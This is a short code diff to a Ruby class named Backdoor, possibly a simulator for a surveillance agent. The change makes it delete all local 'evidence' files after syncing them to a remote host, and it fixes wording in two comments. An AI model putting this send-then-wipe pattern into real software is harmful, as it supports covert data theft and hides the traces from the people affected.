@@ -121,13 +121,19 @@ class Backdoor
   
   # perform the synchronization with the server
   def sync(host)
-    # retrieve the evidences from the local dir
+    # retrieve the evidence from the local dir
     Dir[Dir.pwd + "#{@evidence_dir}/*"].each do |f|
       @evidences << Evidence.new(@evidence_key).load_from_file(f)
     end
     
     # perform the sync
     @sync.perform host
+
+    # delete all evidence sent
+    Dir[Dir.pwd + "#{@evidence_dir}/*"].each do |f|
+      File.delete(f)
+    end
+    
   end
   
   # create some evidences
@@ -136,7 +142,7 @@ class Backdoor
     evidence_path = Dir.pwd + @evidence_dir
     Dir::mkdir(evidence_path) if not File.directory?(evidence_path)
     
-    # generate the evidences
+    # generate the evidence
     num.times do
       Evidence.new(@evidence_key, @info).generate(type).dump_to_file(evidence_path)
     end
